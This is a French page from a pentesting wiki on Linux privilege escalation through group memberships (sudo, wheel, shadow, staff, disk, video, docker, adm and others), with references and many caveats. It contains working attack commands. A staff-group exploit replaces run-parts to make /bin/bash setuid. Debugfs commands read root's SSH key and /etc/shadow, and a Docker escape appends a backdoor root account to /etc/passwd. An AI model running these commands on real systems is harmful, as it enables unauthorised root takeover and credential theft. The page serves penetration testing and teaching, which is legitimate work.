# Groupes intéressants - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Groupes Sudo/Admin

### **PE - Method 1**

**Parfois**, la politique **/etc/sudoers** d’un système (ou un fichier qu’elle inclut) contient des entrées telles que :<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

Cela signifie que tout utilisateur correspondant à l'une ou l'autre entrée peut exécuter n'importe quelle commande en tant que n'importe quel utilisateur cible via `sudo` (sous réserve du reste de la politique).<sup>[[3]](#references)</sup>

Si c'est le cas, pour **devenir root, il suffit d'exécuter** :

```
sudo su
```

Si `sudo -l` autorise une invocation restreinte de `adduser` avec uniquement un nom d’utilisateur, vérifiez si elle crée un groupe principal du même nom qui n’existe pas encore. Un nouveau compte dans ce groupe peut obtenir des privilèges si la politique sudoers effective les accorde déjà à `%group` ; vérifiez à la fois le comportement de création du groupe et la règle du groupe avant de considérer cela comme une voie d’escalade. La création d’un compte modifie le système : examinez d’abord la politique.

### PE - Méthode 2

Trouvez tous les binaires SUID et vérifiez si le binaire **Pkexec** est présent :

```bash
find / -perm -4000 2>/dev/null
```

Si **pkexec est un binaire SUID**, il ne peut exécuter un programme en tant qu’un autre utilisateur que si polkit autorise l’action demandée ; le bit SUID seul ne garantit pas l’accès root. Vérifiez la policy installée et les autorisations de la session cible au lieu de supposer que l’appartenance à **sudo** ou **admin** suffit.<sup>[[4]](#references)[[5]](#references)</sup>

Pour le cas distinct [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt), vérifiez d’abord que `pkexec` est un fichier exécutable appartenant à **root** et doté du bit **SUID**. Un binaire installé sans ce bit ne correspond pas à l’escalade locale de privilèges SUID décrite dans l’avis. Une chaîne de version en amont n’est qu’un indice : les distributions peuvent [rétroporter le correctif vers des versions plus anciennes du paquet](https://ubuntu.com/security/CVE-2021-4034). Vérifiez donc le paquet du fournisseur installé et les mesures d’atténuation avant de le déclarer vulnérable.

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) correspond à un autre cas polkit : une race condition d’autorisation D-Bus, et non une faille SUID de `pkexec`. Vérifiez le paquet polkit du fournisseur installé et si une action D-Bus privilégiée accessible peut permettre une modification utile ; une voie de création de comptes nécessite également un service adapté, tel qu’AccountsService, et l’accès sudo de tout nouveau groupe dépend de la policy sudo effective. Une version polkit signalée ou la présence d’un service installé ne constituent que des pistes, notamment lorsque les fournisseurs [rétroportent des correctifs](https://access.redhat.com/security/cve/cve-2021-3560). L’énumération passive ne doit pas déclencher la race condition.

Sur les distributions qui utilisent encore l’ancien backend Local Authority, inspectez ses règles de groupe avec :

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

Les noms de groupes pertinents et leurs valeurs par défaut varient selon la distribution ; un groupe n’est utile ici que si la politique locale le mentionne.<sup>[[5]](#references)</sup>

Pour **devenir root, vous pouvez exécuter** :

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

Si vous essayez d’exécuter **pkexec** et que vous obtenez cette **erreur** :

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

Dans une session SSH sans agent d’authentification enregistré, `pkexec` peut échouer avec cette erreur même si la politique autoriserait l’action par ailleurs ; polkit décrit `pkttyagent` comme un agent d’authentification en mode texte pour les sessions sans environnement de bureau. Le comportement exact dépend de la version et de la distribution ; vérifiez donc la politique locale et la configuration de l’agent. Une solution de contournement signalée pour certaines versions de NixOS nécessite **2 sessions SSH différentes**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

Une ACL qui refuse à un compte l’accès à `su` s’applique à cet exécutable, pas à toutes les voies permettant d’exécuter une action autorisée par un administrateur. Si des identifiants d’administrateur sont exposés indépendamment, vérifiez si la politique polkit effective autorise une action distincte, comme le démarrage d’un service système transitoire via `systemd-run`, quelle identité l’agent d’authentification accepte et quelle identité le service lancé utiliserait. [Polkit distingue l’authentification en tant que propriétaire de la session de l’authentification en tant qu’administrateur](https://polkit.pages.freedesktop.org/polkit/polkit.8.html), tandis que [systemd-run peut demander au gestionnaire système de lancer un service transitoire](https://systemd.io/CONTROL_GROUP_INTERFACE/). Une entrée dans l’historique, une commande installée ou un fichier de politique lisible ne suffit pas à établir l’autorisation ou la validité des identifiants ; un examen passif ne doit ni soumettre d’identifiants ni démarrer d’unité.

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Groupe wheel

Parfois, une règle sudoers peut aussi contenir cette entrée :

```
%wheel	ALL=(ALL:ALL) ALL
```

Cela signifie que tout utilisateur correspondant à cette entrée peut exécuter n’importe quelle commande en tant que n’importe quel utilisateur cible via `sudo` (sous réserve du reste de la politique).<sup>[[3]](#references)</sup>

Si c’est le cas, pour **devenir root, il suffit d’exécuter** :

```
sudo su
```

## Groupe shadow

Sur les systèmes où les permissions le leur permettent, les utilisateurs du groupe **shadow** peuvent **lire** **/etc/shadow** ; vérifiez le mode et les ACL réellement appliqués sur la cible :<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

Alors, lisez le fichier et essayez de **crack quelques hashes**.

Nuance rapide sur l’état de verrouillage lors du tri des hashes :
- Les entrées contenant `!` ou `*` ne permettent généralement pas de se connecter de manière interactive avec un mot de passe.
- `!hash` signifie que le mot de passe a été verrouillé ; les caractères restants représentent le champ du mot de passe avant son verrouillage.
- Un champ contenant `*` n’est pas un hash `crypt(3)` valide et empêche la connexion par mot de passe UNIX ; n’en déduisez pas qu’un mot de passe avait été défini auparavant.
Cette information est utile pour classifier les comptes, même lorsque la connexion directe est bloquée.<sup>[[6]](#references)</sup>

## Groupe staff

**staff** : permet aux utilisateurs d’ajouter des modifications locales au système (`/usr/local`) sans avoir besoin des privilèges root (notez que les exécutables dans `/usr/local/bin` figurent dans la variable PATH de tout utilisateur et peuvent « override » les exécutables du même nom dans `/bin` et `/usr/bin`). À comparer au groupe « adm », davantage lié à la surveillance et à la sécurité.<sup>[[2]](#references)[[7]](#references)</sup>

Dans les configurations Debian où `/usr/local/bin` précède `/usr/bin` dans `PATH` (comme dans les exemples ci-dessous), une commande sans chemin explicite lance d’abord la copie située dans `/usr/local/bin` ; vérifiez le `PATH` effectif sur la cible.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Si un processus privilégié résout une commande sans chemin via un `/usr/local/bin` modifiable, remplacer cette commande peut permettre son exécution avec les privilèges du processus ; confirmez le chemin réel et le déclencheur avant tout test.

Sur les systèmes Ubuntu, `pam_motd` exécute des scripts exécutables via `run-parts --lsbsysinit` en tant que root à la connexion ; les tâches cron peuvent également utiliser `run-parts`, mais cela dépend de la distribution et de la configuration.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

Lors d’une nouvelle connexion SSH, `pspy` peut aider à confirmer si ce chemin est réellement invoqué sur la cible ; il peut observer les lignes de commande des processus sans accès root.<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Groupe disk

L’appartenance au groupe **disk** peut donner un accès brut aux périphériques bloc et est souvent **proche d’un accès root** ; Debian indique qu’elle est globalement équivalente à root, mais vérifiez les permissions réelles des périphériques et la configuration du stockage sur la cible.<sup>[[7]](#references)</sup>

Les chemins de périphériques courants incluent `/dev/sd*`, mais NVMe et d’autres configurations de stockage utilisent des noms différents.

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs` fonctionne sur les systèmes de fichiers ext2/ext3/ext4 ; les chemins tels que `/root` et `/etc/shadow` ci-dessus désignent des fichiers du système de fichiers ouvert, tandis que le deuxième argument de `dump` est un chemin de sortie sur le système de fichiers natif.<sup>[[8]](#references)</sup> Par exemple, cette commande extrait `/tmp/asd1.txt` du système de fichiers ouvert vers `/tmp/asd2.txt` sur le système de fichiers natif :

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

L’option `-w` ouvre le système de fichiers en lecture-écriture, et la commande `write` copie un fichier natif dans le système de fichiers ouvert. Évitez de l’utiliser sur un système de fichiers monté et actif, car des modifications directes peuvent corrompre le système de fichiers ; travaillez si possible à partir d’une image hors ligne.<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Groupe video

À l’aide de la commande `w`, vous pouvez savoir **qui est connecté au système**. Elle affichera une sortie semblable à celle-ci.<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

L’entrée **tty1** identifie la première console virtuelle Linux ; elle ne prouve pas à elle seule qu’un utilisateur est physiquement présent sur la machine, en particulier dans des conteneurs ou d’autres environnements.<sup>[[21]](#references)</sup>

Sur les systèmes qui exposent un périphérique framebuffer lisible, l’appartenance au groupe **video** peut donner accès à ce périphérique. L’interface framebuffer Linux décrit `/dev/fb0` comme un périphérique mémoire lisible qui peut être copié pour obtenir une capture d’écran ; le chemin `/sys/class/graphics/fb0/virtual_size` n’est disponible que lorsque cet attribut sysfs fbdev est présent. Vérifiez donc d’abord la cible.<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

Si la version installée de **GIMP** propose un importateur de données brutes, ouvrez **`screen.raw`** avec cet importateur ; la prise en charge et les commandes varient selon la version et le plug-in.<sup>[[22]](#references)</sup>

![Groupe Disk - Groupe Video : pour ouvrir l’image brute, vous pouvez utiliser GIMP, sélectionner le fichier screen.raw et choisir le type de fichier Raw image data](<../../../images/image (463).png>)

Réglez la largeur et la hauteur de l’image pour qu’elles correspondent à la géométrie du framebuffer ; essayez les formats de pixels/types d’image disponibles jusqu’à ce que le résultat soit lisible.<sup>[[9]](#references)</sup>

![Groupe Disk - Groupe Video : modifiez ensuite la largeur et la hauteur pour qu’elles correspondent à celles de l’écran, puis essayez différents types d’image (et sélectionnez celui qui affiche le mieux l’écran)](<../../../images/image (317).png>)

## Groupe root

L’appartenance au groupe **root** ne donne pas l’UID de root, mais les fichiers modifiables par le groupe et appartenant à `root` peuvent tout de même être intéressants lorsque des services ou des bibliothèques privilégiés les utilisent. Vérifiez les permissions réelles du fichier et son mode d’utilisation avant de le considérer comme une piste d’élévation de privilèges.

**Vérifiez quels fichiers les membres de root peuvent modifier** :

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Groupe Docker

L’appartenance au groupe `docker` accorde un accès de niveau root au daemon Docker sur les installations standard exécutées en mode rootful. Comme les bind mounts sont en lecture-écriture par défaut, un utilisateur capable de contrôler ce daemon peut monter le `/` de l’hôte dans un conteneur et modifier les fichiers de l’hôte ; cela lui donne effectivement les privilèges root sur l’hôte.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

L’appartenance au groupe peut ne pas être synchronisée entre `/etc/group`, `/etc/gshadow` et le jeton du processus en cours. Si un utilisateur n’apparaît pas dans `id -nG`, mais que `newgrp docker` réussit, vérifiez le groupe affiché par `id` dans le nouveau shell et testez si le socket Docker est réellement accessible en écriture et s’il dessert un daemon rootful. Le nom du groupe, à lui seul, ne prouve pas qu’un contrôle de l’hôte est possible. Limitez la durée de toute sonde automatisée avec `newgrp` afin qu’une demande de mot de passe ne bloque pas l’énumération.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

Enfin, si aucune des suggestions précédentes ne vous convient ou qu’elles ne fonctionnent pas pour une raison quelconque (pare-feu de l’API Docker ?), vous pouvez toujours essayer de **lancer un conteneur privilégié et de vous en échapper**, comme expliqué ici :

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Si vous avez des permissions d’écriture sur le socket Docker, lisez [**cet article sur l’élévation de privilèges en abusant du socket Docker**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Groupe lxc/lxd

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Groupe Adm

En général, les **membres** du groupe **`adm`** ont la permission de **lire les fichiers journaux** situés dans _/var/log/_.\
Par conséquent, si vous avez compromis un utilisateur appartenant à ce groupe, vous devriez absolument **consulter les journaux**.<sup>[[7]](#references)</sup>

## Groupes Backup / Operator / lp / Mail

Ces groupes ont des significations propres aux services et aux distributions. Debian indique que `backup` sert à déléguer les opérations de sauvegarde et de restauration, `lp` aux démons d’impression et `mail` à `/var/mail` : vérifiez donc les permissions locales avant de considérer l’appartenance à ces groupes comme une voie d’élévation de privilèges.<sup>[[7]](#references)</sup>

Ils constituent souvent des vecteurs de **découverte d’identifiants** plutôt que des voies directes vers root :
- **backup** : peut donner accès à des archives contenant des configurations, des clés, des dumps de bases de données ou des tokens.
- **operator** : accès opérationnel propre à la plateforme, susceptible de divulguer des données sensibles à l’exécution.
- **lp** : les files d’attente et répertoires de spouleur d’impression peuvent contenir le contenu de documents.
- **mail** : les spouleurs de courrier peuvent exposer des liens de réinitialisation, des OTP et des identifiants internes.

Considérez l’appartenance à ces groupes comme une exposition de données à forte valeur et rebondissez en recherchant la réutilisation de mots de passe ou de tokens.

## Groupe Auth

Sur OpenBSD, lorsque S/Key est configuré, `/etc/skey` appartient à `root:auth` et l’accès à ses enregistrements nécessite le groupe `auth` ; les enregistrements YubiKey sont stockés dans `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Une configuration vulnérable d’OpenBSD 6.6 avec S/Key ou YubiKey activé permettait aux utilisateurs locaux disposant des privilèges `auth` de devenir root ; Qualys décrit les prérequis et la chaîne d’exploitation, et le PoC associé les met en œuvre.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [Authentification pkexec/pkttyagent sans session GUI (problème NixOS #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [Groupes système - Wiki Debian](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — pages de manuel Debian](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — manuel de référence polkit](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — manuel de référence polkit](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — page de manuel Linux](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Manuel de sécurisation de Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — page de manuel Linux](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Le périphérique framebuffer — documentation du noyau Linux](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — pages de manuel Ubuntu](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — pages de manuel Debian](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — surveillance des processus Linux sans privilèges](https://github.com/DominicBreuker/pspy)
- [13] [Sécurité de Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Gérer Docker en tant qu’utilisateur non-root](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Exécution de conteneurs — documentation Docker](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — pages de manuel OpenBSD](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — pages de manuel OpenBSD](https://man.openbsd.org/login_yubikey.8)
- [18] [Vulnérabilités d’authentification dans OpenBSD — avis de sécurité Qualys](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — PoC d’exploitation locale](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — page de manuel Linux](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Périphériques alloués Linux (version 4.x et ultérieures)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Importation et exportation d’images — documentation GIMP](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
